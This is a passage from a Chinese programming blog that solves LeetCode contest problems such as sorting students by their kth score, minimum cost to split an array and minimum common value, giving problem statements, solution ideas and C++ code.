<h3 id="6297-根据第-K-场考试的分数排序"><a href="#6297-根据第-K-场考试的分数排序" class="headerlink" title="6297. 根据第 K 场考试的分数排序"></a>6297. 根据第 K 场考试的分数排序</h3><p>班里有 <code>m</code> 位学生，共计划组织 <code>n</code> 场考试。给你一个下标从 <strong>0</strong> 开始、大小为 <code>m x n</code> 的整数矩阵 <code>score</code> ，其中每一行对应一位学生，而 <code>score[i][j]</code> 表示第 <code>i</code> 位学生在第 <code>j</code> 场考试取得的分数。矩阵 <code>score</code> 包含的整数 <strong>互不相同</strong> 。</p>
<p>另给你一个整数 <code>k</code> 。请你按第 <code>k</code> 场考试分数从高到低完成对这些学生（矩阵中的行）的排序。</p>
<p>返回排序后的矩阵。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/30/example1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：score = [[10,6,9,1],[7,5,11,2],[4,8,3,15]], k = 2</span><br><span class="line">输出：[[7,5,11,2],[10,6,9,1],[4,8,3,15]]</span><br><span class="line">解释：在上图中，S 表示学生，E 表示考试。</span><br><span class="line">- 下标为 1 的学生在第 2 场考试取得的分数为 11 ，这是考试的最高分，所以 TA 需要排在第一。</span><br><span class="line">- 下标为 0 的学生在第 2 场考试取得的分数为 9 ，这是考试的第二高分，所以 TA 需要排在第二。</span><br><span class="line">- 下标为 2 的学生在第 2 场考试取得的分数为 3 ，这是考试的最低分，所以 TA 需要排在第三。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/30/example2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：score = [[3,4],[5,6]], k = 0</span><br><span class="line">输出：[[5,6],[3,4]]</span><br><span class="line">解释：在上图中，S 表示学生，E 表示考试。</span><br><span class="line">- 下标为 1 的学生在第 0 场考试取得的分数为 5 ，这是考试的最高分，所以 TA 需要排在第一。</span><br><span class="line">- 下标为 0 的学生在第 0 场考试取得的分数为 3 ，这是考试的最低分，所以 TA 需要排在第二。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>m == score.length</code></li>
<li><code>n == score[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 250</code></li>
<li><code>1 &lt;= score[i][j] &lt;= 105</code></li>
<li><code>score</code> 由 <strong>不同</strong> 的整数组成</li>
<li><code>0 &lt;= k &lt; n</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-329/problems/sort-the-students-by-their-kth-score/">https://leetcode.cn/contest/weekly-contest-329/problems/sort-the-students-by-their-kth-score/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>排序
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们直接将二维数组按照数组的第 $k$ 位元素从大到小进行排序即可。我们直接按照大小进行排序即可</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nm \log n)$，其中 $n$ 为矩阵的行数，$m$ 为矩阵的列数。</li>
<li>空间复杂度：$O(m \log n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">sortTheStudents</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; score, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="type">int</span> m = score.<span class="built_in">size</span>(), n = score[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(score.<span class="built_in">begin</span>(), score.<span class="built_in">end</span>(), [&amp;](vector&lt;<span class="type">int</span>&gt; &amp;a, vector&lt;<span class="type">int</span>&gt; &amp;b) &#123;</span><br><span class="line">            <span class="keyword">return</span> a[k] &gt; b[k];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6299-拆分数组的最小代价"><a href="#6299-拆分数组的最小代价" class="headerlink" title="6299. 拆分数组的最小代价"></a>6299. 拆分数组的最小代价</h3><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> 。</p>
<p>将数组拆分成一些非空子数组。拆分的 <strong>代价</strong> 是每个子数组中的 <strong>重要性</strong> 之和。</p>
<p>令 <code>trimmed(subarray)</code> 作为子数组的一个特征，其中所有仅出现一次的数字将会被移除。</p>
<ul>
<li>例如，<code>trimmed([3,1,2,4,3,4]) = [3,4,3,4]</code> 。</li>
</ul>
<p>子数组的 <strong>重要性</strong> 定义为 <code>k + trimmed(subarray).length</code> 。</p>
<ul>
<li>例如，如果一个子数组是 <code>[1,2,3,3,3,4,4]</code> ，<code>trimmed([1,2,3,3,3,4,4]) = [3,3,3,4,4]</code> 。这个子数组的重要性就是 <code>k + 5</code> 。</li>
</ul>
<p>找出并返回拆分 <code>nums</code> 的所有可行方案中的最小代价。</p>
<p><strong>子数组</strong> 是数组的一个连续 <strong>非空</strong> 元素序列。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,1,2,1,3,3], k = 2</span><br><span class="line">输出：8</span><br><span class="line">解释：将 nums 拆分成两个子数组：[1,2], [1,2,1,3,3]</span><br><span class="line">[1,2] 的重要性是 2 + (0) = 2 。</span><br><span class="line">[1,2,1,3,3] 的重要性是 2 + (2 + 2) = 6 。</span><br><span class="line">拆分的代价是 2 + 6 = 8 ，可以证明这是所有可行的拆分方案中的最小代价。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,1,2,1], k = 2</span><br><span class="line">输出：6</span><br><span class="line">解释：将 nums 拆分成两个子数组：[1,2], [1,2,1] 。</span><br><span class="line">[1,2] 的重要性是 2 + (0) = 2 。</span><br><span class="line">[1,2,1] 的重要性是 2 + (2) = 4 。</span><br><span class="line">拆分的代价是 2 + 4 = 6 ，可以证明这是所有可行的拆分方案中的最小代价。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,1,2,1], k = 5</span><br><span class="line">输出：10</span><br><span class="line">解释：将 nums 拆分成一个子数组：[1,2,1,2,1].</span><br><span class="line">[1,2,1,2,1] 的重要性是 5 + (3 + 2) = 10 。</span><br><span class="line">拆分的代价是 10 ，可以证明这是所有可行的拆分方案中的最小代价。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>0 &lt;= nums[i] &lt; nums.length</code></li>
<li><code>1 &lt;= k &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-cost-to-split-an-array/">https://leetcode.cn/problems/minimum-cost-to-split-an-array/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>非常简单的动态规划，我们设 $dp[i]$ 表示前 $i$ 个元素完成拆分的最小代价，此时我们可以得到递推公式如下:<br>$$<br>dp[i] &#x3D; \min(dp[i], dp[k] + cost[k + 1][i] + k) \quad k \in (0, i)<br>$$<br>即每次我们尝试最后拆分子数组的长度，即可得到前 $i$ 个元素的最小拆分代价，其中 $cost[i][j]$ 表示子数组 $nums[i,\cdots, j]$ 的重要性；</li>
<li>我们求子数组的重要性可以用一个哈希表表示即可，非常简单的求子数组中存在重复元素的个数即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n^2)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minCost</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, LONG_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cost = k;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                <span class="type">int</span> x = nums[i - j];</span><br><span class="line">                cnt[x]++;</span><br><span class="line">                <span class="keyword">if</span> (cnt[x] == <span class="number">2</span>) &#123;</span><br><span class="line">                    cost += <span class="number">2</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cnt[x] &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                    cost++;</span><br><span class="line">                &#125;</span><br><span class="line">                dp[i] = <span class="built_in">min</span>(dp[i], dp[i - j] + cost);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6298-执行逐位运算使字符串相等"><a href="#6298-执行逐位运算使字符串相等" class="headerlink" title="6298. 执行逐位运算使字符串相等"></a>6298. 执行逐位运算使字符串相等</h3><p>给你两个下标从 <strong>0</strong> 开始的 <strong>二元</strong> 字符串 <code>s</code> 和 <code>target</code> ，两个字符串的长度均为 <code>n</code> 。你可以对 <code>s</code> 执行下述操作 <strong>任意</strong> 次：</p>
<ul>
<li>选择两个 <strong>不同</strong> 的下标 <code>i</code> 和 <code>j</code> ，其中 <code>0 &lt;= i, j &lt; n</code> 。</li>
<li>同时，将 <code>s[i]</code> 替换为 (<code>s[i]</code> <strong>OR</strong> <code>s[j]</code>) ，<code>s[j]</code> 替换为 (<code>s[i]</code> <strong>XOR</strong> <code>s[j]</code>) 。</li>
</ul>
<p>例如，如果 <code>s = &quot;0110&quot;</code> ，你可以选择 <code>i = 0</code> 和 <code>j = 2</code>，然后同时将 <code>s[0]</code> 替换为 (<code>s[0]</code> <strong>OR</strong> <code>s[2]</code> &#x3D; <code>0</code> <strong>OR</strong> <code>1</code> &#x3D; <code>1</code>)，并将 <code>s[2]</code> 替换为 (<code>s[0]</code> <strong>XOR</strong> <code>s[2]</code> &#x3D; <code>0</code> <strong>XOR</strong> <code>1</code> &#x3D; <code>1</code>)，最终得到 <code>s = &quot;1110&quot;</code> 。</p>
<p>如果可以使 <code>s</code> 等于 <code>target</code> ，返回 <code>true</code> ，否则，返回 <code>false</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;1010&quot;, target = &quot;0110&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：可以执行下述操作：</span><br><span class="line">- 选择 i = 2 和 j = 0 ，得到 s = &quot;0010&quot;.</span><br><span class="line">- 选择 i = 2 和 j = 1 ，得到 s = &quot;0110&quot;.</span><br><span class="line">可以使 s 等于 target ，返回 true 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;11&quot;, target = &quot;00&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：执行任意次操作都无法使 s 等于 target 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == s.length == target.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>s</code> 和 <code>target</code> 仅由数字 <code>0</code> 和 <code>1</code> 组成</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-329/problems/apply-bitwise-operations-to-make-strings-equal/">https://leetcode.cn/contest/weekly-contest-329/problems/apply-bitwise-operations-to-make-strings-equal/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们可以看到字符串 $s$ 中只要存在 $1$，即可按照以下规则:</li>
</ol>
<ul>
<li>将 $(0,1)$ 变为 $(1,1)$;</li>
<li>将 $(1,1)$ 变为 $(0,1)$;<br>因此我们只需要检测字符串中是否存在 $1$ 即可，如果字符串中只有 $0$ 是无法进行替换的。当然实际比赛时用的分类讨论：</li>
<li>两个字符串如果相等，则直接返回；</li>
<li>如果字符串 $s$ 中存在不需要转换的 $1$ 则直接可以进行转换，我们可以把其他所有需要转换的 $0,1$ 进行转换；</li>
<li>如果字符串 $s$ 中同时存在需要转换的 $0$ 与 $1$，此时我们一定可以转换出一个正确的 $1$ 出来，然后利用这个不需要再次转换的 $1$ 将其余所有需要转换的字符完成转换即可；</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符串的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">makeStringsEqual</span><span class="params">(string s, string target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> one = <span class="number">0</span>, diff0 = <span class="number">0</span>, diff1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == target[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] == <span class="string">&#x27;1&#x27;</span>) one++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                    diff0++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    diff1++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((diff0 &gt; <span class="number">0</span> &amp;&amp; diff1 &gt; <span class="number">0</span>) || one &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 96</title>
    <url>/2023/01/24/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/96/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-96"><a href="#leetcode-biweekly-contest-96" class="headerlink" title="leetcode biweekly contest 96"></a>leetcode biweekly contest 96</h2><p>双周赛的题目果真质量高很多，非常不错的题目，几个题目都非常有数学的意味。</p>
<h3 id="2540-最小公共值"><a href="#2540-最小公共值" class="headerlink" title="2540. 最小公共值"></a>2540. 最小公共值</h3><p>给你两个整数数组 <code>nums1</code> 和 <code>nums2</code> ，它们已经按非降序排序，请你返回两个数组的 <strong>最小公共整数</strong> 。如果两个数组 <code>nums1</code> 和 <code>nums2</code> 没有公共整数，请你返回 <code>-1</code> 。</p>
<p>如果一个整数在两个数组中都 <strong>至少出现一次</strong> ，那么这个整数是数组 <code>nums1</code> 和 <code>nums2</code> <strong>公共</strong> 的。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,3], nums2 = [2,4]</span><br><span class="line">输出：2</span><br><span class="line">解释：两个数组的最小公共元素是 2 ，所以我们返回 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,3,6], nums2 = [2,3,4,5]</span><br><span class="line">输出：2</span><br><span class="line">解释：两个数组中的公共元素是 2 和 3 ，2 是较小值，所以返回 2 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums1.length, nums2.length &lt;= 105</code></li>
<li><code>1 &lt;= nums1[i], nums2[j] &lt;= 109</code></li>
<li><code>nums1</code> 和 <code>nums2</code> 都是 <strong>非降序</strong> 的。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-96/problems/minimum-common-value/">https://leetcode.cn/contest/biweekly-contest-96/problems/minimum-common-value/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>双指针
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于两个数组都已经按照从小到大进行排序，所以我们只需遍历两个数组即可，其中 $l_1$ 指向数组 $nums_1$，$l_2$ 指向数组 $nums_2$，则此时移动如下：</li>
</ol>
<ul>
<li>如果 $nums_1[l_1] &lt; nums_2[l_2]$ 时，则移动 $l_1$;</li>
<li>如果 $nums_1[l_1] &gt; nums_2[l_2]$ 时，则移动 $l_2$;</li>
<li>如果 $nums_1[l_1] &#x3D; nums_2[l_2]$ 时，则直接返回 $nums_1[l_1]$；</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n + m)$。其中 $m, n$ 表示两个数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCommon</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l1 = <span class="number">0</span>, l2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l1 &lt; nums1.<span class="built_in">size</span>() &amp;&amp; l2 &lt; nums2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[l1] &gt; nums2[l2]) &#123;</span><br><span class="line">                l2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[l1] &lt; nums2[l2]) &#123;</span><br><span class="line">                l1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[l1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2541-使数组中所有元素相等的最小操作数-II"><a href="#2541-使数组中所有元素相等的最小操作数-II" class="headerlink" title="2541. 使数组中所有元素相等的最小操作数 II"></a>2541. 使数组中所有元素相等的最小操作数 II</h3><p>给你两个整数数组 <code>nums1</code> 和 <code>nums2</code> ，两个数组长度都是 <code>n</code> ，再给你一个整数 <code>k</code> 。你可以对数组 <code>nums1</code> 进行以下操作：</p>
<ul>
<li>选择两个下标 <code>i</code> 和 <code>j</code> ，将 <code>nums1[i]</code> 增加 <code>k</code> ，将 <code>nums1[j]</code> 减少 <code>k</code> 。换言之，<code>nums1[i] = nums1[i] + k</code> 且 <code>nums1[j] = nums1[j] - k</code> 。</li>
</ul>
<p>如果对于所有满足 <code>0 &lt;= i &lt; n</code> 都有 <code>num1[i] == nums2[i]</code> ，那么我们称 <code>nums1</code> <strong>等于</strong> <code>nums2</code> 。</p>
<p>请你返回使 <code>nums1</code> 等于 <code>nums2</code> 的 <strong>最少</strong> 操作数。如果没办法让它们相等，请你返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [4,3,1,4], nums2 = [1,3,7,1], k = 3</span><br><span class="line">输出：2</span><br><span class="line">解释：我们可以通过 2 个操作将 nums1 变成 nums2 。</span><br><span class="line">第 1 个操作：i = 2 ，j = 0 。操作后得到 nums1 = [1,3,4,4] 。</span><br><span class="line">第 2 个操作：i = 2 ，j = 3 。操作后得到 nums1 = [1,3,7,1] 。</span><br><span class="line">无法用更少操作使两个数组相等。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [3,8,5,2], nums2 = [2,4,1,6], k = 1</span><br><span class="line">输出：-1</span><br><span class="line">解释：无法使两个数组相等。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums1.length == nums2.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= nums1[i], nums2[j] &lt;= 109</code></li>
<li><code>0 &lt;= k &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-96/problems/minimum-operations-to-make-array-equal-ii/">https://leetcode.cn/contest/biweekly-contest-96/problems/minimum-operations-to-make-array-equal-ii/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目我想的过于复杂了，实际非常简单，首先我们知道对于位置 $i$ 时，此时 $|nums_1[i] - nums_2[i]|$ 一定能被 $k$ 整除，否则无论如何都无法满足相等：</li>
</ol>
<ul>
<li>$nums_1[i] &gt; nums_2[i]$ 时，此时第 $i$ 位上的数字需要减少 $\frac{|nums_1[i] - nums_2[i]|}{k}$ 次；</li>
<li>$nums_1[i] &lt; nums_2[i]$ 时，此时第 $i$ 位上的数字需要增加 $\frac{|nums_1[i] - nums_2[i]|}{k}$ 次；</li>
<li>我们计算整个数组中增加的次数与减少的次数是否相等即可；</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为给定数组的长度。</li>
<li>空间复杂度：$O(n^2)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum1 = <span class="built_in">accumulate</span>(nums1.<span class="built_in">begin</span>(), nums1.<span class="built_in">end</span>(), <span class="number">0LL</span>);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum2 = <span class="built_in">accumulate</span>(nums2.<span class="built_in">begin</span>(), nums2.<span class="built_in">end</span>(), <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> (sum1 != sum2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> n = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> x = nums1[i] - nums2[i];</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x % k != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                res += x / k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2542-最大子序列的分数"><a href="#2542-最大子序列的分数" class="headerlink" title="2542. 最大子序列的分数"></a>2542. 最大子序列的分数</h3><p>给你两个下标从 <strong>0</strong> 开始的整数数组 <code>nums1</code> 和 <code>nums2</code> ，两者长度都是 <code>n</code> ，再给你一个正整数 <code>k</code> 。你必须从 <code>nums1</code> 中选一个长度为 <code>k</code> 的 <strong>子序列</strong> 对应的下标。</p>
<p>对于选择的下标 <code>i0</code> ，<code>i1</code> ，…， <code>ik - 1</code> ，你的 <strong>分数</strong> 定义如下：</p>
<ul>
<li><code>nums1</code> 中下标对应元素求和，乘以 <code>nums2</code> 中下标对应元素的 <strong>最小值</strong> 。</li>
<li>用公示表示： <code>(nums1[i0] + nums1[i1] +...+ nums1[ik - 1]) * min(nums2[i0] , nums2[i1], ... ,nums2[ik - 1])</code> 。</li>
</ul>
<p>请你返回 <strong>最大</strong> 可能的分数。</p>
<p>一个数组的 <strong>子序列</strong> 下标是集合 <code>&#123;0, 1, ..., n-1&#125;</code> 中删除若干元素得到的剩余集合，也可以不删除任何元素。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,3,3,2], nums2 = [2,1,3,4], k = 3</span><br><span class="line">输出：12</span><br><span class="line">解释：</span><br><span class="line">四个可能的子序列分数为：</span><br><span class="line">- 选择下标 0 ，1 和 2 ，得到分数 (1+3+3) * min(2,1,3) = 7 。</span><br><span class="line">- 选择下标 0 ，1 和 3 ，得到分数 (1+3+2) * min(2,1,4) = 6 。</span><br><span class="line">- 选择下标 0 ，2 和 3 ，得到分数 (1+3+2) * min(2,3,4) = 12 。</span><br><span class="line">- 选择下标 1 ，2 和 3 ，得到分数 (3+3+2) * min(1,3,4) = 8 。</span><br><span class="line">所以最大分数为 12 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [4,2,3,1,1], nums2 = [7,5,10,9,6], k = 1</span><br><span class="line">输出：30</span><br><span class="line">解释：</span><br><span class="line">选择下标 2 最优：nums1[2] * nums2[2] = 3 * 10 = 30 是最大可能分数。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums1.length == nums2.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= nums1[i], nums2[j] &lt;= 105</code></li>
<li><code>1 &lt;= k &lt;= n</code></li>
</ul>
